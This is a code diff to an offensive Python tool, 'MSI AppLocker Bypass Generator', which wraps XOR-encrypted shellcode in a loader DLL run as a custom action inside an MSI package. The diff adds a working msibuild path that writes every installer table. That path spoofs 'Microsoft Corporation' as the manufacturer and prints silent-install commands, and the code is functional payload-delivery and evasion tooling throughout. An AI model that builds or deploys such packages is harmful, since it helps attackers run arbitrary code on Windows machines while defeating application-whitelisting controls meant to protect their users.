@@ -4,10 +4,10 @@ MSI AppLocker Bypass Generator
 Wraps shellcode in a Windows Installer (.msi) package via custom action DLL.
 Bypasses AppLocker default rules since msiexec.exe is a trusted system binary.
 
-Flow: shellcode → XOR encrypt → loader DLL (MinGW) → MSI (wixl or msfvenom)
+Flow: shellcode → XOR encrypt → loader DLL (MinGW) → MSI (wixl/msibuild)
 
-If wixl is unavailable, outputs the loader DLL directly (usable via
-rundll32 or manual MSI wrapping with msfvenom).
+Tries wixl first, then msibuild (msitools IDT tables). If neither is
+available, outputs the loader DLL directly (usable via rundll32).
 
 Usage:
   gen_msi.py -i beacon.bin -o payload.msi
@@ -160,6 +160,12 @@ def find_tool(name):
         subprocess.run([name, '--version'], capture_output=True, timeout=5)
         return name
     except (FileNotFoundError, subprocess.TimeoutExpired):
+        pass
+    # Also try --help (msibuild doesn't have --version)
+    try:
+        subprocess.run([name, '--help'], capture_output=True, timeout=5)
+        return name
+    except (FileNotFoundError, subprocess.TimeoutExpired):
         return None
 
 
@@ -207,6 +213,146 @@ def build_msi_wixl(dll_path, export_name, product_name, output_path):
         return result.returncode == 0
     finally:
         os.unlink(wxs_path)
+
+
+def build_msi_msibuild(dll_path, export_name, product_name, output_path):
+    """Build MSI using msibuild (msitools) with IDT table import."""
+    msibuild = find_tool('msibuild')
+    if not msibuild:
+        return False
+
+    product_guid = '{' + str(uuid.uuid4()).upper() + '}'
+    upgrade_guid = '{' + str(uuid.uuid4()).upper() + '}'
+    comp_guid = '{' + str(uuid.uuid4()).upper() + '}'
+    package_guid = '{' + str(uuid.uuid4()).upper() + '}'
+
+    with tempfile.TemporaryDirectory() as tmpdir:
+        # msibuild v0 binary import expects file in <TableName>/ subdirectory
+        bin_dir = os.path.join(tmpdir, 'Binary')
+        os.makedirs(bin_dir)
+        import shutil
+        shutil.copy2(dll_path, os.path.join(bin_dir, 'loader.dll'))
+
+        # IDT files (tab-delimited, CRLF line endings)
+        idt = {}
+
+        idt['_ForceCodepage'] = '\r\n\r\n1252\t_ForceCodepage\r\n'
+
+        idt['Property'] = (
+            'Property\tValue\r\n'
+            's72\tl0\r\n'
+            'Property\tProperty\r\n'
+            f'ProductCode\t{product_guid}\r\n'
+            'ProductLanguage\t1033\r\n'
+            f'ProductName\t{product_name}\r\n'
+            'ProductVersion\t1.0.0.0\r\n'
+            'Manufacturer\tMicrosoft Corporation\r\n'
+            f'UpgradeCode\t{upgrade_guid}\r\n'
+        )
+
+        idt['Directory'] = (
+            'Directory\tDirectory_Parent\tDefaultDir\r\n'
+            's72\tS72\tl255\r\n'
+            'Directory\tDirectory\r\n'
+            'TARGETDIR\t\tSourceDir\r\n'
+        )
+
+        idt['Component'] = (
+            'Component\tComponentId\tDirectory_\tAttributes\tCondition\tKeyPath\r\n'
+            's72\tS38\ts72\ti2\tS255\tS72\r\n'
+            'Component\tComponent\r\n'
+            f'EmptyComp\t{comp_guid}\tTARGETDIR\t0\t\t\r\n'
+        )
+
+        idt['Feature'] = (
+            'Feature\tFeature_Parent\tTitle\tDescription\tDisplay\tLevel\tDirectory_\tAttributes\r\n'
+            's38\tS38\tL64\tL255\tI2\ti2\tS72\ti2\r\n'
+            'Feature\tFeature\r\n'
+            'Main\t\tMain\t\t\t1\tTARGETDIR\t0\r\n'
+        )
+
+        idt['FeatureComponents'] = (
+            'Feature_\tComponent_\r\n'
+            's38\ts72\r\n'
+            'FeatureComponents\tFeature_\tComponent_\r\n'
+            'Main\tEmptyComp\r\n'
+        )
+
+        idt['Binary'] = (
+            'Name\tData\r\n'
+            's72\tv0\r\n'
+            'Binary\tName\r\n'
+            'ActionDll\tloader.dll\r\n'
+        )
+
+        # Type 65 = DLL in Binary table (1) + ignore return value (64)
+        idt['CustomAction'] = (
+            'Action\tType\tSource\tTarget\r\n'
+            's72\ti2\tS72\tS255\r\n'
+            'CustomAction\tAction\r\n'
+            f'RunAction\t65\tActionDll\t{export_name}\r\n'
+        )
+
+        idt['InstallExecuteSequence'] = (
+            'Action\tCondition\tSequence\r\n'
+            's72\tS255\tI2\r\n'
+            'InstallExecuteSequence\tAction\r\n'
+            'CostInitialize\t\t800\r\n'
+            'FileCost\t\t900\r\n'
+            'CostFinalize\t\t1000\r\n'
+            'InstallValidate\t\t1400\r\n'
+            'InstallInitialize\t\t1500\r\n'
+            'RunAction\tNOT Installed\t1501\r\n'
+            'InstallFinalize\t\t6600\r\n'
+        )
+
+        # Write IDT files
+        for name, content in idt.items():
+            path = os.path.join(tmpdir, f'{name}.idt')
+            with open(path, 'w', newline='') as f:
+                f.write(content)
+
+        # Remove existing output
+        if os.path.exists(output_path):
+            os.unlink(output_path)
+
+        # Use absolute path for the MSI so it works from any CWD
+        abs_output = os.path.abspath(output_path)
+
+        # Set summary information
+        result = subprocess.run(
+            [msibuild, abs_output, '-s',
+             product_name, 'Microsoft Corporation',
+             'x64;1033', package_guid],
+            capture_output=True, text=True, timeout=30,
+            cwd=tmpdir
+        )
+        if result.returncode != 0:
+            print(f"[!] msibuild -s failed: {result.stderr}")
+            return False
+
+        # Import tables in order (cwd=tmpdir so Binary/loader.dll resolves)
+        table_order = [
+            '_ForceCodepage', 'Property', 'Directory', 'Component',
+            'Feature', 'FeatureComponents', 'Binary',
+            'CustomAction', 'InstallExecuteSequence',
+        ]
+
+        for table in table_order:
+            idt_path = f'{table}.idt'
+            result = subprocess.run(
+                [msibuild, abs_output, '-i', idt_path],
+                capture_output=True, text=True, timeout=30,
+                cwd=tmpdir
+            )
+            if result.returncode != 0:
+                print(f"[!] msibuild import {table} failed: {result.stderr}")
+                return False
+
+        if not os.path.exists(abs_output) or os.path.getsize(abs_output) < 2048:
+            return False
+
+        return True
 
 
 def build_msi_msfvenom(dll_path, export_name, output_path):
@@ -280,15 +426,19 @@ def generate(shellcode_path, output_path, product_name=None, xor_key=None,
             print(f"[*] Run: rundll32.exe {os.path.basename(output_path)},{export_name} 0")
             return True
 
-        # Try wixl first
-        if build_msi_wixl(dll_path, export_name, product_name, output_path):
-            msi_size = os.path.getsize(output_path)
-            print(f"[+] Generated MSI (wixl): {output_path} ({msi_size} bytes)")
-            print(f"[*] Install: msiexec /i {os.path.basename(output_path)} /qn")
-            return True
+        # Try wixl first, then msibuild
+        for builder_name, builder_fn in [
+            ('wixl', lambda: build_msi_wixl(dll_path, export_name, product_name, output_path)),
+            ('msibuild', lambda: build_msi_msibuild(dll_path, export_name, product_name, output_path)),
+        ]:
+            if builder_fn():
+                msi_size = os.path.getsize(output_path)
+                print(f"[+] Generated MSI ({builder_name}): {output_path} ({msi_size} bytes)")
+                print(f"[*] Install: msiexec /i {os.path.basename(output_path)} /qn")
+                return True
 
-        # wixl not available — output DLL + instructions
-        print("[!] wixl not available — generating DLL + rundll32 loader")
+        # No MSI builder available — output DLL + instructions
+        print("[!] No MSI builder (wixl/msibuild) — generating DLL + rundll32 loader")
         dll_out = output_path.replace('.msi', '.dll')
         if dll_out == output_path:
             dll_out = output_path + '.dll'
